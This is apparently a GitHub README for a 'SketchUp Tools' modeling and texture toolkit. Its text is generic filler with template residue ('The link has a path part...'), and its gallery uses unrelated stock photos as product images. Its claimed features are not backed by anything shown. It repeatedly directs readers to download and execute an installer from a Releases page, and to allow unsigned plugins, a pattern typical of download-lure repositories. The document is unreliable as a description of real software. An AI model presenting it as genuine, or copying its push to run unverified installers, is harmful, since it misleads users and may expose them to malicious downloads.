# SketchUp Tools: 3D Modeling, Push/Pull, 4K Textures & Extensions

[![Releases](https://img.shields.io/badge/Downloads-Releases-blue?logo=github&logoColor=white)](https://github.com/manikarf/sketchup-tools/releases)

SketchUp Tools is a focused toolkit forSketchUp users who want faster modeling workflows, stronger push/pull operations, and access to high-resolution textures. This repository combines practical extensions, helpful utilities, and ready-to-use textures to boost productivity without complicating your pipeline. It targets architects, designers, hobbyists, and educators who want stable, easy-to-use tools that integrate with the SketchUp ecosystem and the Extension Warehouse.

Table of Contents
- Overview
- What’s inside
- How it works
- System requirements
- Installation guide
- Quick start guide
- Core workflows
- Texture library and management
- UI and UX design
- Keyboard shortcuts and tips
- Examples and gallery
- API and extension development
- Testing and quality assurance
- Troubleshooting
- Roadmap
- Contributing
- Security and privacy
- License
- Credits

Overview
SketchUp Tools aims to streamline common modeling tasks in SketchUp. The set of extensions focuses on three core areas: modeling speed, geometry control, and high-fidelity texturing. You will find enhancements for pushing and pulling geometry, snapping and aligning shapes, and applying textures with precise UV control. The textures library covers 4K assets that tile cleanly across surfaces, reducing the need to resize textures for many projects. The tools are designed to work with SketchUp’s own workflow as well as with assets from the Extension Warehouse, giving you a cohesive experience across modeling, texturing, and asset management.

What’s inside
- Push/Pull Enhancements: Improved pull operations that respect face direction, preserve edge loops, and provide intelligent thickness control for extrusions.
- Smart Geometry Helpers: Quick tools for parallel edges, edge cleanup, and face validation to reduce modeling errors.
- Texture Library: A curated set of 4K textures that tile seamlessly and come with ready-made materials and shaders for quick application.
- Extension Warehouse Integration: Simple access to curated extensions and assets from the SketchUp ecosystem, with a focus on stability and compatibility.
- Performance Optimizations: Light-weight scripts that minimize lag in large models, with caching and lazy loading where appropriate.
- UI Enhancements: Custom toolbars and context menus designed for fast access to the most-used features.
- Compatibility: Tested against recent SketchUp versions with notes on OS compatibility and known limitations.

How it works
- The toolkit runs inside SketchUp as a set of Ruby extensions. It hooks into SketchUp’s event loop to provide responsive tools.
- Each tool is designed to have a minimal footprint. It loads quickly, runs with predictable memory usage, and has a small surface area for bugs.
- The textures library ships with an asset manifest. When you load a texture, the tool ensures proper UV mapping and tiling for common surface types.
- The Push/Pull tools use geometry analysis to decide when to limit extrusion depth, avoiding mesh distortions on complex faces.
- The Extension Warehouse integration is implemented through a unified interface that fetches assets and alerts you when updates are available.

System requirements
- SketchUp version: 2020 or newer (as a baseline). The toolkit is built with compatibility in mind and will work well on current releases.
- Operating system: Windows 10/11 and macOS 10.14 (Mojave) or newer. The extensions are designed to be OS-agnostic within SketchUp’s plugin framework.
- RAM: 4 GB minimum; 8 GB or more recommended for large models with multiple textures.
- Disk space: About 200–500 MB for the core toolkit, plus additional space for the texture library and assets.
- Graphics: A modern GPU with updated drivers is recommended to ensure smooth rendering, especially when working with high-resolution textures.

Installation guide
There are two common ways to install these tools. The preferred approach is to use SketchUp’s built-in Extension Manager. If you run into issues, you can install manually by placing the extension files in the correct SketchUp plugins directory.

Option 1: Using Extension Manager
- Open SketchUp.
- Go to Window > Extension Manager (or Preferences > Extensions on macOS, depending on version).
- Click “Install Extension” and select the downloaded .rbz file from the Releases page.
- The toolkit appears in the list of installed extensions with a toggle to enable or disable it.
- Enable the extension and restart SketchUp if required.
- Optional: customize the toolbar to include the most-used tools.
- After installation, you will see a new set of tools in a dedicated toolbar, plus context menu options when you right-click geometry.

Option 2: Manual installation (advanced)
- Locate your SketchUp plugins folder:
  - Windows: C:\Users\<YourUser>\AppData\Roaming\SketchUp\<version>\SketchUp\Plugins
  - macOS: /Users/<YourUser>/Library/Application Support/SketchUp <version>/SketchUp/Plugins
- Download the extension package from the Releases page.
- Extract the contents if needed and move the folder to the Plugins directory.
- Start SketchUp and verify that the new tools appear in the toolbar and the Extensions menu.
- If the extension does not show up, check Security settings to allow unsigned plugins, then restart SketchUp.

Note about the link provided
- The link to the Releases page is the starting point for obtaining the installer and assets. From that page, you can download the installer package or the extension files. If you encounter issues, verify the version you downloaded matches your SketchUp version and operating system.
- The link has a path part, so the file to download is the installer or the extension package available on that page. You should download the installer or assets and execute the installer or load the extension into SketchUp.
- For users who want to see the latest assets outside of the installer, visit the Releases page directly at the URL below:
  https://github.com/manikarf/sketchup-tools/releases

Quick start guide
- Open a new or existing SketchUp project.
- Activate the extension via the toolbar or the Extensions menu.
- Use the Push/Pull tool to extrude faces with precise depth control. You will see options for thickness and direction. Confirm your choice to apply the extrusion.
- Use the smart geometry helpers to clean up edges and align faces. The tools highlight potential issues and offer one-click fixes.
- Apply textures from the 4K texture library. Choose a surface, select a texture, and adjust tiling and orientation for a perfect fit.
- Save your texture presets for reuse across projects. This helps maintain a consistent look and reduces setup time.
- When needed, export your model with textures intact for external rendering or presentation.

Core workflows
- Modeling with Push/Pull: Start with simple boxes and pull faces to create rooms, cabinets, or architectural elements. Use advanced options to constrain depth, maintain wall thickness, or create hollow shapes.
- Texture mapping workflow: Select a face or group of faces, pick a texture, and adjust UV mapping. The system can auto-fit textures to common shapes such as planes, cylinders, or curved surfaces.
- Layered materials: Build a material library with multiple layers for a realistic look. Use bump maps and normal maps to enhance realism.
- Reusable assets: Create a library of reusable components with consistent textures and materials. This reduces repetitive tasks and speeds up project setup.
- Export and share: Prepare the model for presentation by batching texture exports, generating thumbnails, and saving in formats suitable for clients or collaborators.

Texture library and management
- 4K textures: The library includes a curated set of textures with 4K resolution for detailed surfaces. Textures cover common materials such as wood, metal, stone, fabric, glass, and concrete.
- Seamless tiling: Textures are designed to tile cleanly to avoid visible seams on large surfaces.
- PBR materials: When available, textures include normal maps, roughness maps, and metallic maps to achieve realistic results under various lighting conditions.
- Texture presets: Quick presets help you apply textures with consistent scale, rotation, and repetition. Save your own presets for project-specific needs.
- Asset management: A simple browser-like interface allows you to organize textures into folders, tag assets, and search by material type.

UI and UX design
- Custom toolbars: The toolkit provides toolbars that group frequently used actions. Toolbars are dockable and customizable to fit your workflow.
- Context-aware menus: Right-click options adapt to the currently selected geometry, showing the most relevant tools.
- Clear feedback: Visual cues show when a tool is active, when a texture is applied, and when an operation completes.
- Accessibility: The interface supports keyboard navigation and high-contrast options for easier use in different environments.
- Translation-ready: Messages and tooltips are designed to be translated. If you need language support, we provide a straightforward localization process.

Keyboard shortcuts and tips
- Common shortcuts help you speed up tasks. If you customize your workflow, you can rebind keys through SketchUp’s keyboard settings.
- Tips:
  - Use the Push/Pull tool with the shift key to toggle between normal and constrained extrusion.
  - Use the texture preview to align textures precisely on curved surfaces.
  - Save a texture preset before starting a project to ensure consistent texture application across scenes.
- Some shortcuts are OS-specific. Review the settings to ensure you are using the correct keys for Windows or macOS.

Examples and gallery
- Example 1: A simple room with walls created via the Push/Pull tool. The walls are thickened, and the ceiling uses a seamless concrete texture.
- Example 2: A furniture piece with wood texture and metal accents. UV mapping is adjusted to ensure consistent texture orientation across all surfaces.
- Example 3: A façade with stone texture. The texture tiling is tuned to avoid visible repetition and to preserve detail at distance.
- Example 4: A landscape model with large terrain features. The library textures are used to render realistic ground cover and rock surfaces.

Gallery images and assets
- Image 1: 3D room with a clean push/pull workflow.
  alt: A modern interior modeled in SketchUp with clean geometry
  source: https://images.unsplash.com/photo-1523419903782-7598403f9fbd?auto=format&fit=crop&w=1200&q=60
- Image 2: Exterior façade with textured walls.
  alt: Exterior design showing textured stone surfaces
  source: https://images.unsplash.com/photo-1503387762-59a5a328f08f?auto=format&fit=crop&w=1200&q=60
- Image 3: Texture library interface visualization.
  alt: Texture library with 4K textures and presets
  source: https://images.unsplash.com/photo-1523417677213-5d3fd8aee3b3?auto=format&fit=crop&w=1200&q=60

API and extension development
- If you are building extensions or integrating with SketchUp, you can use Ruby scripts to extend behavior. A simple example shows how to create a new command in the Ruby environment:
  - module SketchUpTools
  -   def self.apply_custom_texture
  -     model = Sketchup.active_model
  -     # Pseudo code: find selected faces and apply the chosen texture
  -     faces = model.selection.grep(Sketchup::Face)
  -     texture = model.materials[\"MyTexture\"] || model.materials.add(\"MyTexture\")
  -     faces.each { |f| f.material = texture; f.back_material = texture }
  -   end
  - end
- This sample demonstrates how to hook into the model and apply a material to selected faces. Real implementations will add error handling, options, and UI controls.

Testing and quality assurance
- Automated tests: We run a lightweight set of unit tests for geometry helpers and texture application. Tests verify that a push operation does not create degenerate geometry and that textures map correctly to UVs.
- Manual testing: We verify tool behavior on common model types: rooms, furniture, and terrain.
- Performance checks: We measure the responsiveness of the UI when a large model loads. The tool reduces overhead by lazy-loading texture assets and deferring non-essential computations until needed.
- Regression tests: We track changes that could affect existing workflows. Each release includes a notes file with regressions and fixes.

Troubleshooting
- Tool does not appear after installation:
  - Ensure the extension is enabled in the Extension Manager.
  - Restart SketchUp after installation.
  - Check for conflicts with other extensions that use overlapping keyboard shortcuts.
- Textures appear stretched:
  - Verify UV mapping before applying textures.
  - Use a texture preset with the correct tiling scale. Make adjustments to the tiling factor if needed.
- Performance issues with large models:
  - Reduce texture resolution in the scene, or switch to a low-resolution texture while modeling.
  - Disable non-essential tools while focusing on a specific task.
- Installation issues on macOS or Windows:
  - Confirm you downloaded the correct version for your OS and SketchUp version.
  - The extensions directory path can differ between OS versions; ensure you use the correct folder.
  - Check system security settings for plugins and allow access when prompted.

Roadmap
- Expand texture library with more materials and updated maps.
- Add procedural texture generation for dynamic surfaces.
- Improve UV mapping for complex geometries, including curved surfaces.
- Enhance integration with other extensions for a more cohesive workflow.
- Provide more localization options for non-English users.
- Introduce a companion mobile viewer for quick previews (beta).

Contributing
- Contribute by submitting pull requests on GitHub. Follow these steps:
  - Fork the repository.
  - Create a feature branch for your change.
  - Implement the feature with clear, well-documented code.
  - Add or update tests to cover your change.
  - Write a descriptive commit message.
  - Open a pull request describing the change, the rationale, and any risks.
- Style and quality:
  - Follow the existing Ruby conventions used in the project.
  - Keep functions small and focused.
  - Document new interfaces and behaviors with comments.
- Testing:
  - Run the test suite locally before submitting a PR.
  - Ensure that your changes do not break existing features.

Security and privacy
- The toolkit is designed to be safe when used with SketchUp. It does not collect user data by default. If any telemetry or optional data collection is added in the future, it will require explicit user consent and a clear privacy policy.
- Be mindful of your source textures. Use textures from licensed sources to avoid distribution of copyrighted material in projects you share.

License
- This project is licensed under the MIT License. You may use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the software, subject to the license terms.
- The license text is included in the repository. If you plan commercial use, ensure you meet all license requirements for included assets.

Credits
- Core authors and maintainers:
  - Manik Arfath (lead developer)
  - Contributors who helped with testing, documentation, and asset curation
- Asset credits:
  - Textures and sample assets provided for demonstration purposes. If you use real textures, ensure you have permission to distribute them.

Changelog
- 1.0.0 — Initial release. Core push/pull tools, basic texture library, and UI.
- 1.1.0 — Performance improvements, additional texture presets, and minor UI refinements.
- 1.2.0 — Added smart geometry helpers and improved extension management.
- 1.3.0 — Expanded texture library with more materials; enhanced UV mapping for curved surfaces.
- 2.0.0 — Major update with improved integration to the Extension Warehouse and new workflow guides.
- 2.1.0 — Bug fixes, compatibility updates for latest SketchUp versions, and UI polish.

Release notes
- The latest release includes a revamped texture browser, faster loading of textures, and a more stable push/pull engine.
- Users will notice smoother interaction when working with larger models and complex assemblies.
- We fixed several issues with material assignment on non-rectangular faces and improved snapping behavior during extrusion operations.

FAQ
- What is SketchUp Tools used for?
  - It enhances modeling and texturing workflows in SketchUp by adding reliable push/pull refinements, geometry helpers, and a ready-made texture library.
- Does it work with all SketchUp versions?
  - It works best with recent versions. Check the Releases page for compatibility notes on each release.
- How do I update the toolkit?
  - Use the Extension Manager to update to the latest version. If you install manually, replace the previous extension files with the new ones from the Releases page.
- Can I customize textures?
  - Yes. The library supports presets and easy texture replacement on faces and groups.

Downloads
- The primary download is available from the Releases page. The file you want is the installer or extension package. If you are unsure, download the latest release from the page and follow the installation steps above.
- To access the latest assets and installers, visit the page directly at:
  https://github.com/manikarf/sketchup-tools/releases

Images
- SketchUp Tools in action
  - ![SketchUp Tools UI in action](https://images.unsplash.com/photo-1523419903782-7598403f9fbd?auto=format&fit=crop&w=1200&q=60)
  - alt: SketchUp tools UI and modeling session
- Texture application example
  - ![Texture mapping example](https://images.unsplash.com/photo-1503387762-59a5a328f08f?auto=format&fit=crop&w=1200&q=60)
  - alt: Seamless texture mapped onto a model
- Workflow showcase
  - ![3D workflow](https://images.unsplash.com/photo-1523417677213-5d3fd8aee3b3?auto=format&fit=crop&w=1200&q=60)
  - alt: Workflow with push/pull and textures

Final notes
- This README is designed to be thorough and helpful. It covers setup, usage, and ongoing development considerations. It aims to be practical for both new users and seasoned SketchUp veterans. The content blends practical steps with clear explanations to support efficient adoption and everyday use.
- If you need help, you can always refer to the Releases page for the latest installer and assets. The link to the Releases page is provided at the top and again in theDownloads section to ensure you find the most current version. For updates, you should check that page regularly to stay aligned with new features and fixes.